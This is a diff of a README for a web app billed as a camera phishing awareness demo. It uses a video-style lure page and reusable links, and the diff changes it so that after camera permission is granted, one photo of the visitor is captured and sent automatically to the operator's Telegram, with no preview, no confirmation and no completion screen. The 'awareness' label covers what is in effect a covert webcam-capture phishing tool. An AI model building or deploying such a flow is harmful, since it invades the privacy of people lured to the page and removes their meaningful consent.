@@ -4,13 +4,13 @@
 [![Express](https://img.shields.io/badge/Express-4.21.2-000000?logo=express&logoColor=white)](https://expressjs.com/)
 [![SQLite](https://img.shields.io/badge/Database-SQLite%20Persistent-003B57?logo=sqlite&logoColor=white)](https://www.sqlite.org/)
 [![Telegram Bot API](https://img.shields.io/badge/Telegram-Bot%20API%20sendPhoto-26A5E4?logo=telegram&logoColor=white)](https://core.telegram.org/bots/api#sendphoto)
-[![Tests](https://img.shields.io/badge/Tests-45%20Passed-brightgreen)](https://nodejs.org/api/test.html)
+[![Tests](https://img.shields.io/badge/Tests-46%20Passed-brightgreen)](https://nodejs.org/api/test.html)
 
 A professional, consent-based Phishing & Camera Security Awareness Demonstration platform designed to evaluate browser permission models and social engineering recognition across desktop and mobile devices.
 
 The platform provides a modern, video-style landing page with video playback simulation, thumbnails, and advertisement-style content, with zero camera access on initial page load or ordinary video playback. A separate, clearly disclosed **Phishing Awareness Simulation** allows visitors to understand how misleading pages lure users and how browser security protects them:
 - **Safe Simulation Mode**: Uses a prerecorded synthetic test graphic (100% safe, zero camera hardware access).
-- **Live Hardware Gate Mode**: Requests camera access only after the visitor chooses Continue, lets the visitor capture one photo, and sends it to Telegram only after the separate **Submit Photo** action.
+- **Live Hardware Gate Mode**: Clearly discloses the automatic photo flow. Continue invokes the browser's native camera permission prompt; if permission is granted, one photo is captured and sent to Telegram automatically without a preview or another confirmation.
 - **Awareness Debrief**: Explains critical red flags (context mismatch, social engineering lures, native permission gates, hardware LED status) and reviews non-sensitive demonstration telemetry (`page_opened`, `demo_button_clicked`, `simulation_completed`).
 
 > [!IMPORTANT]
@@ -144,7 +144,7 @@ npx -y serve frontend -p 3000
    ```
 2. In **Backend & Credentials**, enter your `ADMIN_API_KEY` and click **Save Settings**.
 3. In **Permanent Reusable Demo Link**, create or copy the link once. It stays valid until an administrator disables or revokes it.
-4. Each visit receives a separate, time-limited session. Visitors choose Continue, grant native camera permission, choose Capture Photo, then choose Submit Photo before a photo is sent.
+4. Each visit receives a separate, time-limited session. The notice explains that tapping Continue requests camera access and, after native permission is granted, automatically captures and submits one photo. Denying or cancelling permission sends nothing.
 
 ---
 
@@ -163,20 +163,19 @@ sequenceDiagram
     Visitor->>Landing: Visits landing page
     Landing->>Visitor: Plays educational video animation & shows tech content (Zero camera access)
     Visitor->>DemoPage: Navigates to separate Educational Camera Security Test
-    DemoPage->>Visitor: Displays clear camera and photo submission notice
-    Visitor->>Visitor: Chooses Continue
+    DemoPage->>Visitor: Discloses camera access, one automatic photo, and Telegram delivery
+    Visitor->>DemoPage: Chooses Continue
     DemoPage->>Browser: Requests navigator.mediaDevices.getUserMedia()
     Browser->>Visitor: Displays native browser camera permission dialog
     Visitor->>Browser: Approves camera permission
-    DemoPage->>Visitor: Offers Capture Photo after permission is granted
-    Visitor->>DemoPage: Captures one photo and chooses Submit Photo
-    DemoPage->>Browser: Stops camera tracks after capture or when the visitor exits
+    DemoPage->>Browser: Captures exactly one photo after permission
+    DemoPage->>Browser: Stops camera tracks immediately after capture
     Browser-->>Visitor: Device camera indicator / green dot turns off
-    DemoPage->>Backend: POST /api/sessions/:id/photo (Multipart JPEG)
+    DemoPage->>Backend: Automatically POSTs /api/sessions/:id/photo (Multipart JPEG)
     Backend->>Telegram: sendPhoto(photoBuffer, caption)
     Telegram-->>Backend: 200 OK (Delivered)
     Backend-->>DemoPage: 200 OK (Submission confirmed)
-    DemoPage->>Visitor: Redirects after the server confirms submission
+    DemoPage->>Visitor: Redirects after the server confirms submission, with no completion screen
 ```
 
 ---
@@ -190,7 +189,7 @@ cd backend
 npm test
 ```
 
-The current suite covers 45 backend and browser-flow tests, including permanent-link lifecycle, database reopen persistence, preflight handling, and five independent visitor sessions.
+The current suite covers backend and browser-flow tests, including automatic single-photo submission, denied permission handling, permanent-link lifecycle, database reopen persistence, preflight handling, and five independent visitor sessions.
 
 ---
 
